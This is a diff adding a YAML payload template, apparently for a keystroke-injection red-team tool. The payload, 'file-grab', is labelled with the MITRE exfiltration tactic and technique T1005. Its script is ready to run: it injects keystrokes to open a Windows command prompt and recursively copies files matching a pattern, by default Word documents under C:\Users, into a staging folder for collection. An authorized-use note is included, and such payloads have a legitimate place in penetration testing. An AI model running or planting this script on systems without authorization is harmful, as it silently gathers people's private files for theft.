@@ -1,0 +1,54 @@
+name: file-grab
+description: "Copies files matching a specified pattern from a search path to a staging directory for collection"
+author: TiltedLunar123
+version: "1.0"
+mitre:
+  tactic: Exfiltration
+  technique: T1005
+platform: windows
+parameters:
+  - name: search_path
+    type: string
+    default: "C:\\Users"
+    description: "Root directory to search for matching files"
+  - name: file_pattern
+    type: string
+    default: "*.docx"
+    description: "File pattern to match when searching for files to collect"
+  - name: staging_dir
+    type: string
+    default: "C:\\temp\\staging"
+    description: "Directory to copy matched files to for staging"
+  - name: delay_ms
+    type: integer
+    default: 500
+    description: "Delay in milliseconds between keystrokes"
+safety:
+  requires_confirmation: true
+  scope_note: "Only use on systems you own or have written authorization to test"
+script: |
+  REM -----------------------------------------------
+  REM File Grab - Data from Local System (T1005)
+  REM Searches for files matching a pattern and copies
+  REM them to a staging directory for later collection
+  REM WARNING: Authorized use only
+  REM -----------------------------------------------
+  DELAY 3000
+  DELAY {{ delay_ms }}
+  GUI r
+  DELAY 500
+  STRING cmd /k
+  ENTER
+  DELAY 500
+  DELAY {{ delay_ms }}
+  STRING if not exist "{{ staging_dir }}" mkdir "{{ staging_dir }}"
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING for /r "{{ search_path }}" %f in ({{ file_pattern }}) do @copy "%f" "{{ staging_dir }}" >nul 2>&1
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING echo === Staged Files === & dir "{{ staging_dir }}"
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING exit
+  ENTER
